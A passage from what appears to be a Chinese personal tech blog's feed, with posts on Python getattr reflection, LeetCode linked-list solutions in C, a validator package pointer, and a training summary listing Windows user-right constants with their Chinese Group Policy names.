<span class="token function">getattr</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># known special case of getattr</span>    <span class="token triple-quoted-string string">"""    getattr(object, name[, default]) -> value        Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y.    When a default argument is given, it is returned when the attribute doesn't    exist; without it, an exception is raised in that case.    """</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><ul><li><p>创建package rules 将自定义的三个类分别以.py的形式放进去</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210611162135.png" alt="20210611162135"></p></li><li><p>在package中创建rules.py的文件，将自定义类，导入。<strong>第一行不要也可以</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210611162237.png" alt="20210611162237"></p></li><li><p>在要使用的文件中，以<strong>from rules import rules as Custom</strong>的形式导入</p></li><li><p>编写相应的代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> item <span class="token keyword">in</span> results<span class="token punctuation">:</span><span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Audit"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rules<span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>Custom<span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    rules<span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>它对应的原理通过debug我猜测如下:<br>通过 <code>from rules import rules as Custom</code> 的方式其实是已经创建了<code>Custom</code>这个对象，其拥有三个自定义类的属性。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210611162753.png" alt="20210611162753"></p><p>然后通过<code>getattr</code>得到字符串对应的属性(类),并通过后面括号里面的字符串进行实例化。</p>]]></content>
      
      
      <categories>
          
          <category> 反射 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode3-反转链表II</title>
      <link href="/2021/06/10/leetcode3-fan-zhuan-lian-biao-ii/"/>
      <url>/2021/06/10/leetcode3-fan-zhuan-lian-biao-ii/</url>
      
        <content type="html"><![CDATA[<p>目录:</p><ul><li><a href="#%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8ii">反转链表II</a><ul><li><a href="#%E6%8F%8F%E8%BF%B0">描述</a></li><li><a href="#%E6%80%9D%E8%B7%AF">思路</a><ul><li><a href="#%E4%BB%A3%E7%A0%81">代码</a></li><li><a href="#%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90">复杂度分析</a></li></ul></li><li><a href="#%E4%BC%98%E7%A7%80%E6%80%9D%E8%B7%AF">优秀思路</a><ul><li><a href="#%E6%96%B9%E6%B3%951">方法1:</a><ul><li><a href="#%E4%BB%A3%E7%A0%81-1">代码</a></li><li><a href="#%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90">时间复杂度分析</a></li></ul></li><li><a href="#%E6%96%B9%E6%B3%95%E4%BA%8C">方法二</a><ul><li><a href="#%E4%BB%A3%E7%A0%81-2">代码</a></li><li><a href="#%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90-1">时间复杂度分析</a></li></ul></li></ul></li></ul></li></ul><h1 id="反转链表II"><a href="#反转链表II" class="headerlink" title="反转链表II"></a>反转链表II</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><pre class="line-numbers language-none"><code class="language-none">给你单链表的头指针 head 和两个整数 left 和 right ，其中 left &lt;&#x3D; right 。请你反转从位置 left 到位置 right 的链表节点，返回 反转后的链表 。 示例 1：输入：head &#x3D; [1,2,3,4,5], left &#x3D; 2, right &#x3D; 4输出：[1,4,3,2,5]示例 2：输入：head &#x3D; [5], left &#x3D; 1, right &#x3D; 1输出：[5] 提示：链表中节点数目为 n1 &lt;&#x3D; n &lt;&#x3D; 500-500 &lt;&#x3D; Node.val &lt;&#x3D; 5001 &lt;&#x3D; left &lt;&#x3D; right &lt;&#x3D; n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>左端节点不是起始节点</li></ol><ul><li>找到左端点的前一个节点 <strong>leftpointer_1</strong> + 左端点 <strong>leftpointer</strong></li><li>反转从左端点开始的 <strong>righ-left</strong> 个节点,并保留右端点 <strong>prev</strong>、右端点的下一个节点 <strong>rightpointer_1</strong></li><li>左端节点 <strong>leftpointer</strong> 的next指向右端点的下一个节点 <strong>rightpointer_1</strong></li><li>左端点的前一个节点 <strong>leftpointer_1</strong> 的next指向右端点 </li><li><strong>返回 head 头节点</strong></li></ul><ol start="2"><li>左端节点是起始节点(head)</li></ol><ul><li>左端点的前一个节点 <strong>leftpointer_1</strong> 为 <strong>null</strong></li><li>反转从左端点开始的 <strong>righ-left</strong> 个节点,并保留右端点 <strong>prev</strong>、右端点的下一个节点 <strong>rightpointer_1</strong></li><li>左端节点 <strong>leftpointer</strong> 的next指向右端点的下一个节点 <strong>rightpointer_1</strong></li><li><strong>返回右端节点 <strong>prev</strong></strong></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* reverseBetween(struct ListNode* head, int left, int right) &#123;    struct ListNode* leftpointer_1, * rightpointer_1;    leftpointer_1 &#x3D; rightpointer_1 &#x3D; head;    int leftmove &#x3D; left - 2;    int rigthmove &#x3D; right - left;    int temp &#x3D; rigthmove;    if (temp &#x3D;&#x3D; 0 || temp &lt; 0) return head;    if (leftmove &#x3D;&#x3D; -1) leftpointer_1 &#x3D; NULL;    else    &#123;        while (leftmove &gt; 0 &amp;&amp; leftpointer_1-&gt;next)        &#123;            leftpointer_1 &#x3D; leftpointer_1-&gt;next;            leftmove--;        &#125;    &#125;    struct ListNode* prev &#x3D; leftpointer_1;    struct ListNode* curr, * leftpointer;    if (leftpointer_1)     curr &#x3D; leftpointer &#x3D; leftpointer_1-&gt;next;    else curr &#x3D; leftpointer &#x3D; head;    while (curr &amp;&amp; temp &gt;&#x3D; 0) &#123;        struct ListNode* next &#x3D; curr-&gt;next;        curr-&gt;next &#x3D; prev;        prev &#x3D; curr;        curr &#x3D; next;        temp--;        rightpointer_1 &#x3D; curr;    &#125;    if (leftpointer_1) &#123;        leftpointer_1-&gt;next &#x3D; prev;        leftpointer-&gt;next &#x3D; rightpointer_1;        return head;    &#125;    else &#123;        leftpointer-&gt;next &#x3D; rightpointer_1;        return prev;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度 O(N) 其中 N 是链表总节点数。最坏情况下，需要遍历整个链表。<br>空间复杂度 O(1) 只使用到常数个变量</p><h2 id="优秀思路"><a href="#优秀思路" class="headerlink" title="优秀思路"></a>优秀思路</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1:"></a>方法1:</h3><p>与我们的方法非常类似，但在编码的过程中，采用了虚拟头节点的方式，避免了左端点是否是起始点的分类讨论。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210610143526.png" alt="20210610143526"></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode *reverseBetween(struct ListNode *head, int left, int right) &#123;    &#x2F;&#x2F; 因为头节点有可能发生变化，使用虚拟头节点可以避免复杂的分类讨论    struct ListNode *dummyNode &#x3D; malloc(sizeof(struct ListNode));    dummyNode-&gt;val &#x3D; -1;    dummyNode-&gt;next &#x3D; head;    struct ListNode *pre &#x3D; dummyNode;    &#x2F;&#x2F; 第 1 步：从虚拟头节点走 left - 1 步，来到 left 节点的前一个节点    &#x2F;&#x2F; 建议写在 for 循环里，语义清晰    for (int i &#x3D; 0; i &lt; left - 1; i++) &#123;        pre &#x3D; pre-&gt;next;    &#125;    &#x2F;&#x2F; 第 2 步：从 pre 再走 right - left + 1 步，来到 right 节点    struct ListNode *rightNode &#x3D; pre;    for (int i &#x3D; 0; i &lt; right - left + 1; i++) &#123;        rightNode &#x3D; rightNode-&gt;next;    &#125;    &#x2F;&#x2F; 第 3 步：切断出一个子链表（截取链表）    struct ListNode *leftNode &#x3D; pre-&gt;next;    struct ListNode *curr &#x3D; rightNode-&gt;next;    &#x2F;&#x2F; 注意：切断链接    pre-&gt;next &#x3D; NULL;    rightNode-&gt;next &#x3D; NULL;    &#x2F;&#x2F; 第 4 步：同第 206 题，反转链表的子区间    reverseLinkedList(leftNode);    &#x2F;&#x2F; 第 5 步：接回到原来的链表中    pre-&gt;next &#x3D; rightNode;    leftNode-&gt;next &#x3D; curr;    return dummyNode-&gt;next;&#125;作者：LeetCode-Solution链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;reverse-linked-list-ii&#x2F;solution&#x2F;fan-zhuan-lian-biao-ii-by-leetcode-solut-teyq&#x2F;来源：力扣（LeetCode）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="时间复杂度分析"><a href="#时间复杂度分析" class="headerlink" title="时间复杂度分析"></a>时间复杂度分析</h4><p>时间复杂度 O(N) 其中 N 是链表总节点数。最坏情况下，需要遍历整个链表。<br>空间复杂度 O(1) 只使用到常数个变量</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210610144049.png" alt="20210610144049"></p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode *reverseBetween(struct ListNode *head, int left, int right) &#123;    &#x2F;&#x2F; 因为头节点有可能发生变化，使用虚拟头节点可以避免复杂的分类讨论    struct ListNode *dummyNode &#x3D; malloc(sizeof(struct ListNode));    dummyNode-&gt;val &#x3D; -1;    dummyNode-&gt;next &#x3D; head;    struct ListNode *pre &#x3D; dummyNode;    for (int i &#x3D; 0; i &lt; left - 1; i++) &#123;        pre &#x3D; pre-&gt;next;    &#125;    struct ListNode *cur &#x3D; pre-&gt;next;    struct ListNode *next;    for (int i &#x3D; 0; i &lt; right - left; i++) &#123;        next &#x3D; cur-&gt;next;        cur-&gt;next &#x3D; next-&gt;next;        next-&gt;next &#x3D; pre-&gt;next;        pre-&gt;next &#x3D; next;    &#125;    return dummyNode-&gt;next;&#125;作者：LeetCode-Solution链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;reverse-linked-list-ii&#x2F;solution&#x2F;fan-zhuan-lian-biao-ii-by-leetcode-solut-teyq&#x2F;来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="时间复杂度分析-1"><a href="#时间复杂度分析-1" class="headerlink" title="时间复杂度分析"></a>时间复杂度分析</h4><p>时间复杂度 O(N) 其中 N 是链表总节点数。最坏情况下，需要遍历整个链表。<br>空间复杂度 O(1) 只使用到常数个变量</p>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode2-反转链表</title>
      <link href="/2021/06/08/leetcode2-fan-zhuan-lian-biao/"/>
      <url>/2021/06/08/leetcode2-fan-zhuan-lian-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">示例<span class="token operator">:</span>输入<span class="token operator">:</span> <span class="token number">1</span><span class="token operator">-></span><span class="token number">2</span><span class="token operator">-></span><span class="token number">3</span><span class="token operator">-></span><span class="token number">4</span><span class="token operator">-></span><span class="token number">5</span><span class="token operator">-></span><span class="token constant">NULL</span>输出<span class="token operator">:</span> <span class="token number">5</span><span class="token operator">-></span><span class="token number">4</span><span class="token operator">-></span><span class="token number">3</span><span class="token operator">-></span><span class="token number">2</span><span class="token operator">-></span><span class="token number">1</span><span class="token operator">-></span><span class="token constant">NULL</span> 限制：<span class="token number">0</span> <span class="token operator">&lt;=</span> 节点个数 <span class="token operator">&lt;=</span> <span class="token number">5000</span>来源：力扣（LeetCode）链接：https<span class="token operator">:</span><span class="token comment">//leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>链表没有节点</li><li>链表只有一个节点</li><li>链表有两个节点</li><li>链表有三个及三个以上的节点</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/%E7%94%A8ipad%E6%8A%8A%E6%80%9D%E8%B7%AF%E7%9A%84%E5%9B%BE%E7%94%BB%E5%9C%A8%E8%BF%99.png" alt="用ipad把思路的图画在这"></p><h3 id="时间复杂度分析"><a href="#时间复杂度分析" class="headerlink" title="时间复杂度分析"></a>时间复杂度分析</h3><p>由于只用遍历一遍链 <br><br>时间复杂度为<strong>O(n) n 为链表的长度</strong> <br><br>以上代码，<strong>分配的空间不会随着处理数据量的变化而变化，因此得到空间复杂度为 O空间复杂度为O(1</strong>)</p><h2 id="优秀思路"><a href="#优秀思路" class="headerlink" title="优秀思路"></a>优秀思路</h2><p>这次优秀思路其实跟我思路差不多，但是优秀思路的代码写的要更简洁。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210608172423.png" alt="20210608172423"></p><h2 id="我思路的代码"><a href="#我思路的代码" class="headerlink" title="我思路的代码"></a>我思路的代码</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* reverseList(struct ListNode* head) &#123;    ListNode* first,*second,*third;        &#x2F;&#x2F; 0个节点    if (head &#x3D;&#x3D; NULL) return NULL;    &#x2F;&#x2F; 1个节点    if (head-&gt;next &#x3D;&#x3D; NULL) return head;    &#x2F;&#x2F; 2个节点    if (head-&gt;next-&gt;next &#x3D;&#x3D; NULL) &#123;        first &#x3D; head;        second &#x3D; head-&gt;next;        first-&gt;next &#x3D; NULL;        second-&gt;next &#x3D; first;        return second;    &#125;    &#x2F;&#x2F; 3个以上的节点    first &#x3D; head;    second &#x3D; head-&gt;next;    third &#x3D; head-&gt;next-&gt;next;        while (1) &#123;        second-&gt;next &#x3D; first;        if (third &#x3D;&#x3D; NULL) break;        first &#x3D; second;        second &#x3D; third;        third &#x3D; third-&gt;next;    &#125;    &#x2F;&#x2F;把第一个节点的next指向null    head-&gt;next &#x3D; NULL;    &#x2F;&#x2F;返回头节点    return second;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>validator使用</title>
      <link href="/2021/06/08/validator-shi-yong/"/>
      <url>/2021/06/08/validator-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="validator使用"><a href="#validator使用" class="headerlink" title="validator使用"></a>validator使用</h1><p>看清楚使用的是哪个包，去找相应的文档就行。</p><p>我使用的是这个validator包 :<a href="https://github.com/CSenshi/Validator">https://github.com/CSenshi/Validator</a></p><p>网上的教程很多都是 <a href="https://github.com/mansam/validator.py%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8%E7%9C%8B%E4%BA%86%E6%96%87%E6%A1%A3%E5%92%8C%E6%BA%90%E7%A0%81%E4%B9%8B%E5%90%8E%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E4%B8%80%E4%B8%8B%E3%80%82">https://github.com/mansam/validator.py，所以在看了文档和源码之后，把使用方法整理一下。</a></p><p>本来是要整理一下，但是发现人家文档写的很清楚了。</p><p>链接：<a href="https://github.com/CSenshi/Validator">https://github.com/CSenshi/Validator</a></p>]]></content>
      
      
      <categories>
          
          <category> 包使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训day6-day10</title>
      <link href="/2021/06/07/shi-xun-day6-10/"/>
      <url>/2021/06/07/shi-xun-day6-10/</url>
      
        <content type="html"><![CDATA[<h1 id="实训总结"><a href="#实训总结" class="headerlink" title="实训总结"></a>实训总结</h1><p>总体来说这一周相较于上一周来说没有学到太多东西，最有收获的还是初步地应用了一下反射，还有就是关于编码的简洁性。</p><p>诸如向安全组审核的东西，不过是读文件审核再写回数据库，可以说没有什么难度，只是工作的过程相对来说要繁琐一些，要去跟英文的文档做一个对应，复制粘贴本地安全组中的说明内容等等。</p><h1 id="circular-import"><a href="#circular-import" class="headerlink" title="circular import"></a>circular import</h1><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210607095716.png" alt="20210607095716"></p><h1 id="RFC"><a href="#RFC" class="headerlink" title="RFC"></a>RFC</h1><p>RFC（Request For Comments）意即“请求评论”，包含了关于Internet的几乎所有重要的文字资料</p><h1 id="用户权限分配"><a href="#用户权限分配" class="headerlink" title="用户权限分配"></a>用户权限分配</h1><p>或者直接去微软的网站上面翻译：<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn221963%28v%3dws.11%29">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn221963%28v%3dws.11%29</a></p><h2 id="对应中文"><a href="#对应中文" class="headerlink" title="对应中文"></a>对应中文</h2><table><thead><tr><th>常量值</th><th>组策略</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>从网络访问此计算机</td></tr><tr><td>SeBackupPrivilege</td><td>备份文件和目录</td></tr><tr><td>SeChangeNotifyPrivilege</td><td>绕过遍历检查</td></tr><tr><td>SeSystemtimePrivilege</td><td>更改系统时间</td></tr><tr><td>SeCreatePagefilePrivilege</td><td>创建一个页面文件</td></tr><tr><td>SeDebugPrivilege</td><td>调试程序</td></tr><tr><td>SeRemoteShutdownPrivilege</td><td>从远程系统强制关机</td></tr><tr><td>SeAuditPrivilege</td><td>管理审核安全日志</td></tr><tr><td>SeIncreaseQuotaPrivilege</td><td>信任计算机和用户帐户可以执行委派</td></tr><tr><td>SeIncreaseBasePriorityPrivilege</td><td>提高计划优先级</td></tr><tr><td>SeLoadDriverPrivilege</td><td>加载和卸载设备驱动程序</td></tr><tr><td>SeBatchLogonRight</td><td>作为批处理作业登录</td></tr><tr><td>SeServiceLogonRight</td><td>拒绝作为服务登录</td></tr><tr><td>SeInteractiveLogonRight</td><td>本地登录</td></tr><tr><td>SeSecurityPrivilege</td><td>管理审核和安全日志</td></tr><tr><td>SeSystemEnvironmentPrivilege</td><td>修改固件环境值</td></tr><tr><td>SeProfileSingleProcessPrivilege</td><td>配置文件单一进程</td></tr><tr><td>SeSystemProfilePrivilege</td><td>配置文件系统性能</td></tr><tr><td>SeAssignPrimaryTokenPrivilege</td><td>创建令牌对象</td></tr><tr><td>SeRestorePrivilege</td><td>还原文件和目录</td></tr><tr><td>SeShutdownPrivilege</td><td>关闭系统</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td>取得文件或其他对象的所有权</td></tr><tr><td>SeUndockPrivilege</td><td>从扩展坞上移除计算机</td></tr><tr><td>SeManageVolumePrivilege</td><td>执行卷维护任务</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>允许通过远程桌面服务登录</td></tr><tr><td>SeImpersonatePrivilege</td><td>身份验证后模拟客户端</td></tr><tr><td>SeCreateGlobalPrivilege</td><td>创建全局对象</td></tr><tr><td>SeIncreaseWorkingSetPrivilege</td><td>增加进程工作集</td></tr><tr><td>SeTimeZonePrivilege</td><td>更改时区</td></tr><tr><td>SeCreateSymbolicLinkPrivilege</td><td>创建符号链接</td></tr><tr><td>SeDelegateSessionUserImpersonatePrivilege</td><td>信任计算机和用户帐户可以执行委派</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 国信安实训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-1-单链表输出倒数第k个节点</title>
      <link href="/2021/06/06/leetcode1-dan-lian-biao-shu-chu-dao-shu-di-k-ge-jie-dian/"/>
      <url>/2021/06/06/leetcode1-dan-lian-biao-shu-chu-dao-shu-di-k-ge-jie-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="单链表输出倒数第k个节点"><a href="#单链表输出倒数第k个节点" class="headerlink" title="单链表输出倒数第k个节点"></a>单链表输出倒数第k个节点</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>遍历得到链表的节点个数</li><li>再根据节点个数和k得到目标节点的正向序号</li><li>遍历链表找到该节点</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="单链表版"><a href="#单链表版" class="headerlink" title="单链表版"></a>单链表版</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode &#123;    int val;    struct ListNode* next;&#125;;struct ListNode* getKthFromEnd(struct ListNode* head, int k) &#123;    int all &#x3D; 0;    ListNode* temp &#x3D; head;    while (temp-&gt;next)    &#123;        all++;        temp &#x3D; temp-&gt;next;    &#125;    all &#x3D; all + 1;&#x2F;&#x2F;加上最后一个节点    int num &#x3D; all - k + 1;    if (num &lt; 1) return NULL;    else    &#123;        temp &#x3D; head;        while (num !&#x3D; 1)        &#123;            temp &#x3D; temp-&gt;next;            num--;        &#125;        return temp;    &#125;&#125;int main()&#123;    ListNode *ahead, *after, *head, *result, *temp;    ahead &#x3D; (struct ListNode*)malloc(sizeof(ListNode));    ahead-&gt;val &#x3D; 1;    head &#x3D; ahead;    for (int i &#x3D; 1; i &lt; 7; i&#x3D;i+1) &#123;        after &#x3D; (struct ListNode*)malloc(sizeof(ListNode));        after-&gt;val &#x3D; i + 1;        after-&gt;next &#x3D; NULL;        ahead-&gt;next &#x3D; after;        ahead &#x3D; after;    &#125;    temp &#x3D; head;    while (1) &#123;        printf_s(&quot;%d-&gt;&quot;, temp-&gt;val);        if (temp-&gt;next&#x3D;&#x3D;NULL) &#123;            printf_s(&quot;\n%s&quot;, &quot;跳出循环&quot;);            break;        &#125;        temp &#x3D; temp-&gt;next;    &#125;        result &#x3D; getKthFromEnd(head, 1);    if (result-&gt;next) &#123;        printf_s(&quot;\n%d-&gt;%d&quot;, result-&gt;val, result-&gt;next-&gt;val);&#x2F;&#x2F;这里有可能result没有next节点    &#125;    else         printf_s(&quot;\n%d&quot;, result-&gt;val);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="双链表版"><a href="#双链表版" class="headerlink" title="双链表版"></a>双链表版</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;双向链表版struct ListNode &#123;    int val;    struct ListNode* next;&#x2F;&#x2F;前向指针    struct ListNode* previous;&#x2F;&#x2F;后向指针&#125;;struct ListNode* getKthFromEnd(struct ListNode* head, int k) &#123;    ListNode* temp &#x3D; head;    while (temp-&gt;next)    &#123;        temp &#x3D; temp-&gt;next;    &#125;    if (k &lt; 1) return NULL;    else    &#123;        while (k !&#x3D; 1)        &#123;            temp &#x3D; temp-&gt;previous;            k--;        &#125;        return temp;    &#125;&#125;int main()&#123;    ListNode* ahead, * after, * head, * result, * temp;    ahead &#x3D; (struct ListNode*)malloc(sizeof(ListNode));    ahead-&gt;val &#x3D; 1;    ahead-&gt;previous &#x3D; NULL;    head &#x3D; ahead;    &#x2F;&#x2F;temp &#x3D; ahead;    for (int i &#x3D; 1; i &lt; 7; i &#x3D; i + 1) &#123;        after &#x3D; (struct ListNode*)malloc(sizeof(ListNode));        after-&gt;val &#x3D; i + 1;        after-&gt;next &#x3D; NULL;        after-&gt;previous &#x3D; ahead;                ahead-&gt;next &#x3D; after;        ahead &#x3D; after;    &#125;    temp &#x3D; head;    while (1) &#123;        printf_s(&quot;%d-&gt;&quot;, temp-&gt;val);        if (temp-&gt;next &#x3D;&#x3D; NULL) &#123;            printf_s(&quot;\n%s&quot;, &quot;跳出循环&quot;);            break;        &#125;        temp &#x3D; temp-&gt;next;    &#125;    result &#x3D; getKthFromEnd(head, 2);    if (result-&gt;next) &#123;        printf_s(&quot;\n%d-&gt;%d&quot;, result-&gt;val, result-&gt;next-&gt;val);&#x2F;&#x2F;这里有可能result没有next节点    &#125;    else        printf_s(&quot;\n%d&quot;, result-&gt;val);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="优秀解题思路"><a href="#优秀解题思路" class="headerlink" title="优秀解题思路"></a>优秀解题思路</h2><ul><li>初始化两个指针a,b 指向头节点</li><li>b指针先往前走k个节点</li><li>a,b指针同时向前走，直到b为空指针</li></ul><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* getKthFromEnd(struct ListNode* head, int k)&#123;    struct ListNode *prev, *cur;    prev &#x3D; head;    cur &#x3D; head;    for(k&#x3D;k-1;k&gt;0;k--)&#123;        cur &#x3D; cur-&gt;next;    &#125;    while(cur-&gt;next !&#x3D; NULL)&#123;        prev &#x3D; prev-&gt;next;        cur &#x3D; cur-&gt;next;    &#125;    return prev;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
